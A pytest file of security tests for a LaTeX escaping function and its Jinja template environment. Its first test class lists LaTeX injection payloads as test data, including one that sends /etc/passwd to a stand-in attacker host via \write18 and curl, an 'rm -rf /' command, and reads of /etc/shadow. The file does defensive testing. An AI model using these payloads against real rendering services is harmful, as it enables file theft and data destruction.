"""Tests for LaTeX escaping.

These are security tests, not formatting tests. Each injection case below is a
real technique: if any of them stops failing, user-supplied text can execute or
exfiltrate through the render pipeline.
"""

from __future__ import annotations

import pytest

from worker.latex import LatexSafe, build_environment, escape_latex


class TestInjectionNeutralisation:
    @pytest.mark.parametrize(
        "payload",
        [
            r"\input{/etc/passwd}",
            r"\write18{curl https://attacker.example/$(cat /etc/passwd)}",
            r"\immediate\write18{rm -rf /}",
            r"\def\x{\x}\x",                      # infinite expansion
            r"\catcode`\@=11 \@@input",           # catcode manipulation
            r"\openout15=/tmp/pwned.tex",
            r"\csname @@input\endcsname",
            r"\lstinputlisting{/etc/shadow}",
        ],
    )
    def test_control_sequences_are_defanged(self, payload: str) -> None:
        """No backslash may survive as a command introducer."""
        escaped = escape_latex(payload)
        assert "\\input" not in escaped
        assert "\\write18" not in escaped
        assert "\\def" not in escaped
        assert "\\csname" not in escaped
        # The backslash itself is rendered as visible text.
        assert r"\textbackslash{}" in escaped

    def test_brace_groups_cannot_be_opened(self) -> None:
        """Every brace in the input must come out escaped, none dropped.

        The old expectation (one "\\{" and one "\\}") was simply miscounted:
        the input "}{\\evil{" contains TWO opening braces and ONE closing
        brace, so correct escaping yields two "\\{" and one "\\}". Expecting
        one would require dropping a brace -- i.e. weakening the escaper.
        The code was right; the test was wrong. The command itself must also
        be defanged: no raw "\\evil" may survive.
        """
        escaped = escape_latex("}{\\evil{")
        assert escaped.count(r"\{") == 2
        assert escaped.count(r"\}") == 1
        assert r"\evil" not in escaped

    @pytest.mark.parametrize("char", ["$", "&", "#", "_", "%", "~", "^"])
    def test_every_special_char_is_escaped(self, char: str) -> None:
        assert char not in escape_latex(char).replace("\\" + char, "")

    def test_math_mode_cannot_be_entered(self) -> None:
        """An unbalanced $ would otherwise swallow the rest of the document."""
        assert "$" not in escape_latex("cost $5m").replace(r"\$", "")

    def test_comment_char_cannot_truncate_a_line(self) -> None:
        """A raw % comments out everything after it, silently deleting content."""
        escaped = escape_latex("100% growth")
        assert r"\%" in escaped
        assert "growth" in escaped


class TestOrderingBug:
    def test_backslash_replacement_does_not_re_escape_its_own_braces(self) -> None:
        """The classic chained-replace bug.

        Replacing `\\` with `\\textbackslash{}` and *then* escaping braces
        yields `\\textbackslash\\{\\}`, which typesets as literal garbage.
        A single translate pass cannot produce this.
        """
        assert escape_latex("\\") == r"\textbackslash{}"
        assert escape_latex("a\\b") == r"a\textbackslash{}b"


class TestUnicodeHandling:
    @pytest.mark.parametrize(
        ("raw", "expected_fragment"),
        [
            ("don’t", "don't"),
            ("“quoted”", "``quoted''"),
            ("2019–2023", "2019--2023"),
            ("wait — really", "wait --- really"),
            ("and so on…", r"\ldots{}"),
        ],
    )
    def test_word_processor_characters_are_transliterated(
        self, raw: str, expected_fragment: str
    ) -> None:
        """Curly quotes and dashes arrive with every Word paste."""
        assert expected_fragment in escape_latex(raw)

    def test_emoji_is_dropped_rather_than_failing_the_compile(self) -> None:
        """Losing an emoji is cosmetic; a failed render is an outage."""
        assert escape_latex("Shipped it 🚀 fast") == "Shipped it  fast"

    def test_accented_latin_is_preserved(self) -> None:
        """Names must survive. Dropping them would be a serious defect."""
        assert "é" in escape_latex("José Núñez")
        assert "ñ" in escape_latex("José Núñez")

    def test_control_characters_are_stripped(self) -> None:
        assert escape_latex("a\x00b\x07c") == "abc"


class TestLatexSafe:
    def test_safe_strings_pass_through_unescaped(self) -> None:
        assert escape_latex(LatexSafe(r"\textbf{bold}")) == r"\textbf{bold}"

    def test_plain_strings_do_not(self) -> None:
        assert escape_latex(r"\textbf{bold}") != r"\textbf{bold}"


class TestTemplateEnvironment:
    def test_variables_are_escaped_without_an_explicit_filter(self) -> None:
        """Escape-by-default: a forgotten filter must not be an injection hole."""
        env = build_environment()
        template = env.from_string("Name: << name >>")
        rendered = template.render(name=r"\input{/etc/passwd}")
        assert r"\input" not in rendered

    def test_missing_variable_raises(self) -> None:
        """StrictUndefined: a hole in a resume is worse than a failed render."""
        from jinja2 import UndefinedError

        env = build_environment()
        with pytest.raises(UndefinedError):
            env.from_string("<< nope >>").render()

    def test_delimiters_do_not_collide_with_latex(self) -> None:
        """Real LaTeX markup must pass through the template untouched."""
        env = build_environment()
        source = r"\section{Experience} % a comment {with braces}"
        assert env.from_string(source).render() == source
